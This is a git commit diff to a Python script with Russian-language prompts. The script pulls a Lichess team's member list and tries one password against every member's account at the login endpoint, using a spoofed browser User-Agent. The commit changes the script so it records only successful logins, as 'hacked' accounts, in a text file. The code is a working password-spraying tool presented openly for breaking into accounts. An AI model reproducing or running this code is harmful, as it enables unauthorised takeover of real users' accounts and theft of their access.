9852d76160386e83c2e4ee71ca8bd03192e166ad
Ma3rX <118477698+ma3rxofficial@users.noreply.github.com>
2023-08-31 16:13:02 +0300

    added saving only hacked accs(password_checking)

--- password_check.py
+++ password_check.py
@@ -1,8 +1,8 @@
 import requests, ndjson, time
 from config import *
 
-def start(password, team):
 
+def start(password, team):
     print(yellow + "[..] Получаем список, это может занять некоторое время...")
     r_m = requests.get('https://lichess.org/api/team/' + team + '/users')
     users = r_m.json(cls=ndjson.Decoder)
@@ -20,15 +20,20 @@ def start(password, team):
         if (len(username) < 4): continue
 
         r = requests.post("https://lichess.org/login",
-                              data={"username": username, "password": password, "remember": "true"},
-                              headers={"X-Requested-With": "XMLHttpRequest",
-                                       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"})
+                          data={"username": username, "password": password, "remember": "true"},
+                          headers={"X-Requested-With": "XMLHttpRequest",
+                                   "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"})
 
         print(f"{get_ts()} {r}, {username}: {password}")
 
-        with open("hacked_checking.txt", "a", encoding="utf-8") as h_list: h_list.write(f"{get_ts()} {r}, {username}: {password} \n")
 
-        time.sleep(5)
+        if str(r) == "<Response [200]>":
+             with open("hacked_checking.txt", "a", encoding="utf-8") as h_list:
+                 h_list.write(f"{get_ts()} {username}: {password} \n")
+     
+             time.sleep(5)
+
 
 if __name__ == "__main__":
-    start(password=input(green + "Введите пароль, которым вы хотите проверить клуб: " + magenta), team=input(yellow + "Введите ID клуба: " + magenta))
+    start(password=input(green + "Введите пароль, которым вы хотите проверить клуб: " + magenta),
+          team=input(yellow + "Введите ID клуба: " + magenta))
